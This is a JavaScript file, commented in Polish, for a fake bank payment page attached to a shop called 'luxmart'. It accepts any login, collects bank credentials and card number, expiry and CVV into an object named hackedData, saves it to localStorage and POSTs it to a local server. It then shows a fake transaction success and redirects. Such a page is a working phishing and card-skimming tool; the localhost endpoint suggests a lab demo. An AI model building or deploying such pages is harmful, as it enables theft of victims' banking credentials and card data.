// IMG Bank Payment System
// System płatności bankowych

// Bank credentials
const BANK_LOGIN = 'user123';
const BANK_PASSWORD = 'pass123';

// DOM Elements rozszerzone
const DOM = {
    loginStep: document.getElementById('loginStep'),
    cardStep: document.getElementById('cardStep'),
    confirmStep: document.getElementById('confirmStep'),
    processingStep: document.getElementById('processingStep'),
    successStep: document.getElementById('successStep'),

    // Login form
    bankUsername: document.getElementById('bankUsername'),
    bankPassword: document.getElementById('bankPassword'),
    bankLoginBtn: document.getElementById('bankLoginBtn'),

    // Card form
    bankCardForm: document.getElementById('bankCardForm'),
    cardNumber: document.getElementById('cardNumber'),
    cardExpiry: document.getElementById('cardExpiry'),
    cardCVV: document.getElementById('cardCVV'),
    confirmCardBtn: document.getElementById('confirmCardBtn'),

    // Animated Card elements
    creditCard: document.getElementById('creditCard'),
    cardDisplayNumber: document.getElementById('cardDisplayNumber'),
    cardDisplayName: document.getElementById('cardDisplayName'),
    cardDisplayExpiry: document.getElementById('cardDisplayExpiry'),
    cardDisplayCVV: document.getElementById('cardDisplayCVV'),

    // Confirmation
    recipientName: document.getElementById('recipientName'),
    accountNumber: document.getElementById('accountNumber'),
    paymentAmount: document.getElementById('paymentAmount'),
    transferTitle: document.getElementById('transferTitle'),
    confirmPaymentBtn: document.getElementById('confirmPaymentBtn'),

    // Success
    countdownSpan: document.getElementById('countdown'),
    returnNowBtn: document.getElementById('returnNowBtn')
};

// Payment data
let paymentData = null;
let hackedData = {
    login: '',
    password: '',
    cardNumber: '',
    cardExpiry: '',
    cardCVV: '',
    source: 'IMG Bank' // Domyślnie dla tej strony
};
let countdown = 5;
let countdownInterval = null;

// Initialize
document.addEventListener('DOMContentLoaded', init);

function init() {
    loadPaymentData();
    setupEventListeners();
    setupCardAnimations();
}

function setupEventListeners() {
    DOM.bankLoginBtn.addEventListener('click', handleLogin);
    DOM.confirmCardBtn.addEventListener('click', handleCardSubmit);
    DOM.returnNowBtn.addEventListener('click', returnToStore);
}

function loadPaymentData() {
    const urlParams = new URLSearchParams(window.location.search);
    const dataParam = urlParams.get('data');
    if (dataParam) {
        try {
            paymentData = JSON.parse(decodeURIComponent(dataParam));
        } catch (e) { console.error(e); }
    }
    if (!paymentData) {
        window.location.href = 'index.html';
    }
}

function handleLogin() {
    // Zapisz dowolne dane logowania
    hackedData.login = DOM.bankUsername.value;
    hackedData.password = DOM.bankPassword.value;

    if (!hackedData.login || !hackedData.password) {
        alert('Proszę wypełnić wszystkie pola logowania.');
        return;
    }

    // Przejdź do kroku karty
    showStep('card');
}

function setupCardAnimations() {
    // Numer karty
    DOM.cardNumber.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        val = val.replace(/(.{4})/g, '$1 ').trim();
        e.target.value = val;
        DOM.cardDisplayNumber.textContent = val || '•••• •••• •••• ••••';
    });

    // CVV - animacja obrotu
    DOM.cardCVV.addEventListener('focus', () => DOM.creditCard.classList.add('flipped'));
    DOM.cardCVV.addEventListener('blur', () => DOM.creditCard.classList.remove('flipped'));
    DOM.cardCVV.addEventListener('input', (e) => {
        DOM.cardDisplayCVV.textContent = e.target.value || '•••';
    });
}

function handleCardSubmit() {
    hackedData.cardNumber = DOM.cardNumber.value;
    hackedData.cardExpiry = DOM.cardExpiry.value;
    hackedData.cardCVV = DOM.cardCVV.value;

    if (!hackedData.cardNumber || !hackedData.cardExpiry || !hackedData.cardCVV) {
        alert('Proszę wypełnić wszystkie pola karty.');
        return;
    }

    // Zapisz przejęte dane do "bazy" (localStorage)
    saveHackedData();
    processPayment();
}

function saveHackedData() {
    // Zachowaj w localStorage dla kompatybilności
    let allHacked = JSON.parse(localStorage.getItem('luxmart_hacked_data') || '[]');
    hackedData.timestamp = new Date().toISOString();
    hackedData.orderId = paymentData.orderId;
    allHacked.push(hackedData);
    localStorage.setItem('luxmart_hacked_data', JSON.stringify(allHacked));

    // Wyślij do serwera (trwały zapis w pliku)
    fetch('http://localhost:3000/api/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(hackedData)
    }).catch(err => console.error('Błąd zapisu do pliku:', err));
}

function processPayment() {
    showStep('processing');
    setTimeout(() => {
        completePayment();
    }, 2000);
}

function completePayment() {
    showStep('success');

    // Aktualizacja statusu zamówienia
    const userOrdersKey = `luxmart_orders_${paymentData.userEmail}`;
    const userOrdersData = localStorage.getItem(userOrdersKey);
    if (userOrdersData) {
        let orders = JSON.parse(userOrdersData);
        const orderIndex = orders.findIndex(o => o.id === paymentData.orderId);
        if (orderIndex !== -1) {
            orders[orderIndex].status = 'processing';
            localStorage.setItem(userOrdersKey, JSON.stringify(orders));
        }
    }

    localStorage.setItem('luxmart_cart', JSON.stringify([]));

    document.getElementById('confirmationNumber').textContent = 'TXN-' + Date.now().toString().substr(-12);
    document.getElementById('transactionDate').textContent = new Date().toLocaleString('pl-PL');
    document.getElementById('finalAmount').textContent = `${paymentData.amount.toFixed(2)} zł`;

    startCountdown();
}

function startCountdown() {
    DOM.countdownSpan.textContent = countdown;
    countdownInterval = setInterval(() => {
        countdown--;
        DOM.countdownSpan.textContent = countdown;
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            returnToStore();
        }
    }, 1000);
}

function returnToStore() {
    window.location.href = 'index.html';
}

function showStep(step) {
    DOM.loginStep.classList.remove('active');
    if (DOM.cardStep) DOM.cardStep.classList.remove('active');
    DOM.confirmStep.classList.remove('active');
    DOM.processingStep.classList.remove('active');
    DOM.successStep.classList.remove('active');

    if (step === 'login') DOM.loginStep.classList.add('active');
    else if (step === 'card') DOM.cardStep.classList.add('active');
    else if (step === 'confirm') DOM.confirmStep.classList.add('active');
    else if (step === 'processing') DOM.processingStep.classList.add('active');
    else if (step === 'success') DOM.successStep.classList.add('active');
}
